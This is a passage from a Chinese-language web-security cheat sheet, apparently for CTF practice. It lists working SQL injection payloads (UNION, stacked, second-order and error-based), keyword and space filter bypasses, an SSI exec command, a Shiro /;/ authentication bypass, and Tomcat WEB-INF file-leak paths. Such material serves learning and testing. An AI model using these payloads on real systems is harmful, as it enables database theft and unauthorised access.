<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=c1># 报错: The used SELECT statements have a different number of columns
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=c1># 一个一个试出原始查询语句返回列数, 成功则1,2,3将填入相应回显字段中</span></span></span></code></pre></div></div><ul><li>order by</li><li>group by</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=mi>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=o>#</span><span class=w> </span><span class=err>更改数字，表示以第几列进行排序</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>报错</span><span class=p>:</span><span class=w> </span><span class=k>Unknown</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=s1>&#39;3&#39;</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=s1>&#39;order clause&#39;</span><span class=w> </span><span class=err>则表示有</span><span class=mi>2</span><span class=err>列字段数</span></span></span></code></pre></div></div><p><strong>基础信息</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>version</span><span class=p>()</span><span class=w> </span><span class=o>#</span><span class=w> </span><span class=err>数据库版本信息</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=o>#</span><span class=w> </span><span class=err>数据库名</span></span></span></code></pre></div></div><p><strong>爆破全部数据库</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>schema_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=o>%</span><span class=mi>23</span></span></span></code></pre></div></div><p><strong>查数据库中表</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>#</span><span class=w> </span><span class=err>在第三个回显中显示数据库表</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=o>%</span><span class=mi>23</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=o>#</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=w> </span><span class=n>group_concat</span><span class=p>:</span><span class=w> </span><span class=err>查询结果逗号连接成字符串</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>table_name</span><span class=p>:</span><span class=w> </span><span class=err>是系统数据库</span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables中一个字段</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=w> </span><span class=n>table_schema</span><span class=p>:</span><span class=w> </span><span class=err>表所属数据库名称</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>database</span><span class=p>():</span><span class=w> </span><span class=err>当前连接的数据库名称</span></span></span></code></pre></div></div><p><strong>对表查列字段</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>)</span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;leak_table_name&#39;</span></span></span></code></pre></div></div><p><strong>对数据表爆数据</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=n>leak_column_name1</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;-&#39;</span><span class=p>,</span><span class=w> </span><span class=n>leak_column_name2</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>data_base_table_name</span><span class=w> </span><span class=o>#</span><span class=w> </span><span class=err>或</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>data_base_name</span><span class=p>.</span><span class=n>dtable_name</span></span></span></code></pre></div></div><h4 id=堆叠注入>堆叠注入</h4><ul><li>利用 <code>;</code> 在原SQL查询后追加新语句（有时需将前语句闭合）</li></ul><p><strong>测试</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-mysql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=mi>1</span><span class=p>;</span><span class=w> </span><span class=k>show</span><span class=w> </span><span class=k>databases</span><span class=p>;</span><span class=w> </span><span class=c1># 获取数据库
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=p>;</span><span class=w> </span><span class=k>show</span><span class=w> </span><span class=kp>tables</span><span class=p>;</span><span class=w> </span><span class=c1># 查看所有数据表
</span></span></span><span class=line><span class=cl><span class=c1># 继续查看表x和表123中内容
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>show</span><span class=w> </span><span class=n>columns</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>x</span><span class=p>;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>show</span><span class=w> </span><span class=n>columns</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=o>`</span><span class=mi>123</span><span class=w> </span><span class=o>`</span><span class=p>;</span><span class=w> </span><span class=c1># 需使用反引号</span></span></span></code></pre></div></div><p><strong>替换</strong>：利用改名，将本不可读取的表数据修改为可读取表中数据</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-mysql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=k>rename</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=n>t1</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>t2</span><span class=p>;</span><span class=w> </span><span class=c1># 将t1表改名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>alter</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=n>words</span><span class=w> </span><span class=k>add</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=k>unsigned</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=no>Null</span><span class=w> </span><span class=kp>auto_increment</span><span class=w> </span><span class=k>primary</span><span class=w> </span><span class=k>key</span><span class=p>;</span><span class=w> </span><span class=c1># 新表添加新列名:保持一致操作
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>alter</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=n>words</span><span class=w> </span><span class=k>change</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=kt>varchar</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span><span class=w> </span><span class=c1># 改名flag为data</span></span></span></code></pre></div></div><h4 id=二次注入>二次注入</h4><p><strong>漏洞点</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>mysql_query</span><span class=p>(</span><span class=s2>&#34;insert into users(username, passwd, info) values (&#39;</span><span class=si>{</span><span class=nv>$username</span><span class=si>}</span><span class=s2>&#39;, &#39;</span><span class=si>{</span><span class=nv>$password</span><span class=si>}</span><span class=s2>&#39;, &#39; &#39;);&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$info</span> <span class=o>=</span> <span class=nx>query</span><span class=p>(</span><span class=s2>&#34;select info from users where username=&#39;</span><span class=si>{</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span><span class=si>}</span><span class=s2>&#39;;&#34;</span><span class=p>);</span> <span class=c1>// 显示info
</span></span></span></code></pre></div></div><p>1中无法回显，通过1中闭合union连接命令，在2中同样执行最终回显</p><h4 id=报错注入>报错注入</h4><ul><li>基于XPAT(XML)报错注入函数（xpath）：<code>updatexml</code>对xml文档数据查询及修改，<code>extractvalue</code>查询</li><li>若<code>XPath_string</code>不符合格式会以系统报错提示错误，查询字符串长度最大32位，需使用<code>right(), left(), substr()</code>截取字符串</li></ul><p><strong>获取用户名，数据库，版本</strong></p><ul><li>可以将其中user(), database(), version()等替换为select语句</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># updatexml获取</span>
</span></span><span class=line><span class=cl>1<span class=err>&#39;</span> or <span class=o>(</span>updatexml<span class=o>(</span>1, concat<span class=o>(</span>0x7e, database<span class=o>()</span>, 0x7e<span class=o>)</span>, 1<span class=o>))</span> <span class=c1># </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># extractvalue 从 XML 数据中提取值 </span>
</span></span><span class=line><span class=cl>xxx and <span class=o>(</span>extractvalue<span class=o>(</span>1, concat<span class=o>(</span>0x7e, user<span class=o>()</span>, 0x7e<span class=o>)))</span><span class=p>;</span> <span class=c1># </span></span></span></code></pre></div></div><p><strong>后续获取</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>#</span><span class=w> </span><span class=err>表名</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1># 字段名
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=k>or</span><span class=p>(</span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=p>)</span><span class=k>where</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=k>like</span><span class=p>(</span><span class=s1>&#39;table_name&#39;</span><span class=p>)),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>1</span><span class=p>))</span><span class=o>#</span></span></span></code></pre></div></div><p><strong>字符限制绕过</strong></p><ul><li>right获取后半部分内容</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(ziduan_name,25))))from(table_name)),0x7e),1))#
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=o>^</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=k>right</span><span class=p>(</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=n>group_concat</span><span class=p>(</span><span class=n>ziduan_name</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=k>table_name</span><span class=p>))),</span><span class=mi>30</span><span class=p>))</span><span class=o>#</span></span></span></code></pre></div></div><h4 id=绕过-1>绕过</h4><p><strong>关键字绕过</strong></p><p>将<code>or</code>, <code>select</code>, <code>union</code>, <code>where</code>, <code>and</code>, <code>from</code>进行屏蔽</p><p><code>str_replace</code>函数屏蔽将目标字符串只过滤一次，可以通过双写绕过：<code>uunionnion, sselectelect, oorr</code></p><p><strong>编码预处理绕过</strong></p><ul><li>select被过滤，将SQL语句16进制编码：<code>select * from a</code> ==> <code>123</code></li><li>prepare from预处理进行编码转换，execute执行prepare创建的SQL语句，SET一次只能赋一个值</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SET</span><span class=o>@</span><span class=n>a</span><span class=o>=</span><span class=mi>0</span><span class=n>x123</span><span class=p>;</span><span class=k>prepare</span><span class=w> </span><span class=n>execsql</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=o>@</span><span class=n>a</span><span class=p>;</span><span class=k>execute</span><span class=w> </span><span class=n>execsql</span><span class=p>;</span><span class=w> </span><span class=o>#</span><span class=w> </span><span class=n>payload</span></span></span></code></pre></div></div><p><strong>Handler</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>handler</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>open</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=o>`</span><span class=n>a</span><span class=o>`</span><span class=p>;</span><span class=w> </span><span class=k>handler</span><span class=w> </span><span class=o>`</span><span class=n>a</span><span class=o>`</span><span class=w> </span><span class=k>read</span><span class=w> </span><span class=k>next</span><span class=p>;</span><span class=w> </span><span class=o>#</span><span class=w> </span><span class=err>文件操作读取</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>HANDLER</span><span class=w> </span><span class=n>FlagHere</span><span class=w> </span><span class=k>OPEN</span><span class=p>;</span><span class=w> </span><span class=k>HANDLER</span><span class=w> </span><span class=n>FlagHere</span><span class=w> </span><span class=k>READ</span><span class=w> </span><span class=k>FIRST</span><span class=p>;</span><span class=w> </span><span class=k>HANDLER</span><span class=w> </span><span class=n>FlagHere</span><span class=w> </span><span class=k>CLOSE</span><span class=p>;</span></span></span></code></pre></div></div><p><strong>空格绕过</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># 使用()绕过, 或直接不输入空格
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=s1>&#39; or 
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=p>(</span><span class=k>or</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>select</span><span class=p>(</span><span class=nx>group_concat</span><span class=p>(</span><span class=nx>column_name</span><span class=p>))</span><span class=nx>from</span><span class=p>(</span><span class=nx>information_schema</span><span class=o>.</span><span class=nx>columns</span><span class=p>)</span><span class=nx>where</span><span class=p>(</span><span class=nx>table_name</span><span class=p>)</span><span class=nx>like</span><span class=p>(</span><span class=s1>&#39;xxx&#39;</span><span class=p>))</span></span></span></code></pre></div></div><p><strong>等号绕过</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># 使用 like 绕过 =, 万能密码修改
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=err>&#39;</span><span class=k>or</span><span class=p>((</span><span class=mi>1</span><span class=p>)</span><span class=nx>like</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span><span class=c1># 
</span></span></span></code></pre></div></div><p><strong>or绕过</strong></p><p>使用<code>^</code>可绕过</p><h3 id=ssi注入漏洞>SSI注入漏洞</h3><ul><li>Server-Side Includes Injection，服务端包含注入，SSI赋予html静态页面动态效果</li><li>存在<code>.shtml, .stm, .shtm</code>网页上某部分变量可控，如下，通过远程命令注入动态回显</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-html"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span><span class=p>&gt;</span>{$what}<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>{{username}}<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span><span class=p>&gt;</span>{%$a%}<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span></span></span></code></pre></div></div><p><strong>利用命令格式</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-js"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c>&lt;!--</span><span class=err>#</span><span class=nx>exec</span> <span class=nx>cmd</span><span class=o>=</span><span class=s2>&#34;command&#34;</span><span class=o>--&gt;</span></span></span></code></pre></div></div><h2 id=java>JAVA</h2><h3 id=shiro漏洞>Shiro漏洞</h3><h4 id=身份验证绕过>身份验证绕过</h4><p>Apache Shiro &lt; 1.5.3</p><ul><li>Shiro 特征：响应数据包中<code>Set-Cookie: rememberMe=deleteMe;</code></li><li>直接访问<code> /shiro/admin/page</code> 返回302跳转要求登录</li><li>访问 <code>/;/shiro/admin/page</code> 能绕过Shiro权限验证访问到/admin路由信息</li></ul><h3 id=文件泄露>文件泄露</h3><ul><li>存在文件下载</li></ul><p>tomcat敏感文件</p><ul><li><code>/WEB-INF/web.xml</code>：Web配置文件，servlet及其他应用组件配置、命名规则</li><li><code>/WEB-INF/classes/</code>：包含所有 Servlet 类及其他类文件</li><li><code>/WEB-INF/lib/</code>：存放 web 应用所需各种 JAR 文件</li><li><code>/WEB-INF/src/</code>：源码目录</li><li><code>/WEB-INF/database.properties</code>：数据库配置文件</li></ul><p><strong>web.xml查看</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-xml"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;servlet&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;servlet-name&gt;</span>FlagController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;servlet-class&gt;</span>com.wm.ctf.FlagController<span class=nt>&lt;/servlet-class&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/servlet&gt;</span></span></span></code></pre></div></div><p><strong>读取对应文件</strong>：<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><h3 id=sql注入>SQL注入</h3><p>漏洞点：字符串拼接</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-java"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isNullOrEmpty</span><span class=p>(</span><span class=n>userName</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>sql</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=s>&#34; and u.userName like &#39;%&#34;</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=n>userName</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;%&#39;&#34;</span><span class=p>);</span><span class=c1>// 模糊查询: % 匹配任意长度的字符</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span></span></span></code></pre></div></div><p><strong>前后闭合</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-java"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// %25 为 %, 此处需要用%25, % 会报错</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>name</span><span class=o>%</span><span class=n>25</span><span class=err>&#39;</span><span class=w> </span><span class=n>union</span><span class=w> </span><span class=n>select</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=n>2</span><span class=p>,</span><span class=n>version</span><span class=p>(),</span><span class=n>4</span><span class=p>,</span><span class=n>5</span><span class=p>,</span><span class=n>6</span><span class=p>,</span><span class=n>database</span><span class=p>(),</span><span class=n>8</span><span class=p>,</span><span class=n>9</span><span class=p>,</span><span class=n>10</span><span class=p>,</span><span class=n>11</span><span class=p>,</span><span class=n>12</span><span class=p>,</span><span class=n>13</span><span class=p>,</span><span class=n>14</span><span class=w> </span><span class=n>where</span><span class=w> </span><span class=sc>&#39;1&#39;</span><span class=w> </span><span class=n>like</span><span class=w> </span><span class=err>&#39;</span><span class=o>%</span><span class=n>251</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>//</span><span class=w> </span><span class=n>大于14不返回结果可判断回显列数</span></span></span></code></pre></div></div><p><strong>PrepareStatement</strong></p><p>JAVA SQL API中用于执行参数化查询的接口，可防止SQL注入，SQL语句<strong>提前编译</strong>，参数作为数据处理而非直接拼接</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-java"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// 查询公共类</span><span class=w>
